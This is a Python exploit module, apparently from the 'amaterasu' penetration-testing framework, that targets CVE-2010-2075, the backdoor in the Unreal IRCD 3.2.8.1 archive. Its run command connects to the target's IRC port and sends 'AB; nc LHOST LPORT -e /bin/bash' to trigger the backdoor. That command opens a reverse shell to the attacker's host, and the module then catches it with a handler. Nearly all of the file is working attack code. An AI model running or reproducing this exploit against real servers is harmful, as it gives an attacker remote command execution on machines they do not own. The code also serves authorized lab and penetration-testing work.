#!/usr/bin/env python3
#coding: utf-8
#Project amaterasu

import argparse
import cmd2
from huepy import *
import socket

from lib.opt_data import *
from lib.modules.reverse_shell_tcp_handle import *
from lib.checksettings import *

set_parser = argparse.ArgumentParser()
set_subparsers = set_parser.add_subparsers(title='subcommands', help='subcommand help')

parser_target = set_subparsers.add_parser('target', help='target help')
parser_target.add_argument('target', type=str)

parser_RPORT = set_subparsers.add_parser('RPORT', help='set remote port. Default: 6667')
parser_RPORT.add_argument('RPORT', type=str)

parser_LPORT = set_subparsers.add_parser('LPORT', help='set local port. Default: 4444')
parser_LPORT.add_argument('LPORT', type=str)

parser_LHOST = set_subparsers.add_parser('LHOST', help='set local host.')
parser_LHOST.add_argument('LHOST', type=str)

show_parser = argparse.ArgumentParser()
show_parser.add_argument('show', choices=["config"])

class cve_2010_2075(cmd2.Cmd):
	'''
	Exploits a malicious backdoor that was added 
	to the Unreal IRCD 3.2.8.1 download archive. 
	This backdoor was present in the 
	Unreal3.2.8.1.tar.gz archive between 
	November 2009 and June 12th 2010.
	'''

	def __init__(self):
		super().__init__()

		self.RPORT = 6667
		self.LPORT = 4444
		self.LHOST = checkSettings().get_lhost()
		self.target = None

		self.metadata = {'Description'	: 'Exploits a malicious backdoor that was added to the Unreal IRCD 3.2.8.1 download archive.\n' +
						'This backdoor was present in the Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th 2010.',
						'Author'	 	: 'Sam Marx <sam-marx[at]protonmail.com>',
						'Version'	 	: '1.0',
		}
		self.prompt = 'amaterasu[exploitation/cve_2010_2075]> '

		Options = Opt()
		Options.new(name='target', current_setting=self.target, required=True, description="Target's IP")
		Options.new(name='RPORT', current_setting=self.RPORT, required=False, description='Remote RPORT to be accessed')
		Options.new(name='LPORT', current_setting=self.LPORT, required=False, description='LOCAL PORT to be used')
		Options.new(name='LHOST', current_setting=self.LHOST, required=False, description='LOCAL HOST to be used')

		self.intro = f'{lightblue("Provided by:")}\n{self.metadata["Author"]}\n\n'
		self.intro += f'{lightblue("Description:")}\n{self.metadata["Description"]}\n\n'
		self.intro += f'{lightblue("Options:")}\n{Options.create_table()}\n'

	def show(self, args):
		'''Shows something'''
		if args.show == 'config':
			print(f'TARGET: {self.target}\nRPORT: {self.RPORT}')

	def set_target(self, args):
		self.target = args.target
		print(info(f'TARGET set: {self.target}'))

	def set_RPORT(self, args):
		self.RPORT = args.RPORT
		print(info(f'RPORT set: {self.RPORT}'))

	def set_LPORT(self, args):
		self.LPORT = args.LPORT
		print(info(f'RPORT set: {self.LPORT}'))

	def set_LHOST(self, args):
		self.LHOST = args.LHOST
		print(info(f'RPORT set: {self.LHOST}'))

	parser_target.set_defaults(func = set_target)
	parser_RPORT.set_defaults(func = set_RPORT)
	parser_LPORT.set_defaults(func = set_LPORT)
	parser_LHOST.set_defaults(func = set_LHOST)
	show_parser.set_defaults(func = show)

	@cmd2.with_argparser(set_parser)
	def do_set(self, args):
		'''Used to set options.'''
		func = getattr(args, 'func', None)

		if func is not None:
			func(self, args)
		else:
			self.do_help('set')

	@cmd2.with_argparser(show_parser)
	def do_show(self, args):
		''' Show [config, target etc.].'''
		func = getattr(args, 'func', None)

		if func is not None:
			func(self, args)
		else:
			self.do_help('show')

	def do_back(self, args):
		'''Goes back to Amaterasu.'''
		return True

	def do_run(self, args):
		''' Runs the module.'''

		if self.target is not None:
			try:
				payload = f'nc {self.LHOST} {self.LPORT} -e /bin/bash'

				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.connect((f'{self.target}', self.RPORT))
				sock.recv(1024)
				print(info('Sending backdoor command...'))
				sock.send(f'AB; {payload}\n'.encode())
				sock.close()

				handle(self.LHOST, self.LPORT, 'AB; {}\n').run()
			except Exception as e:
				print(f'Error: {e}')
		else:
			print(bad('You need to set all necessary options.'))